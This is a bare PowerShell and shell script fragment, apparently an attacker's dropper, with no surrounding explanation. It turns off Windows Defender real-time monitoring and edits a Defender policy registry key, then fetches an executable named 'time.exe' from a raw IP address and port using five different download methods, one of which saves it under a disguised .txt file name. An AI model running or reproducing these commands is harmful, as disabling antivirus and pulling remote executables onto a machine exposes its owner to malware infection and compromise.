


New-ItemProperty -Path "HKLM:\Software\policies\microsoft\windows defender" -name disableantispyware -value 0 –Force

Set-MpPreference -DisableRealtimeMonitoring $true



$URL = "http://31.166.215.197:45005/time.exe"

$Path=”C:\Files\MyFile.txt”
Invoke-WebRequest -URI $URL -OutFile $Path
(New-Object System.Net.WebClient).DownloadFile ($URL, $Path)
Start-BitsTransfer -Source $URL -Destination $Path


wget 31.166.215.197:45005/time1.exe
curl 31.166.215.197:45005/time.exe
Invoke-WebRequest http://31.166.215.197:45005/time.exe -O time.exe
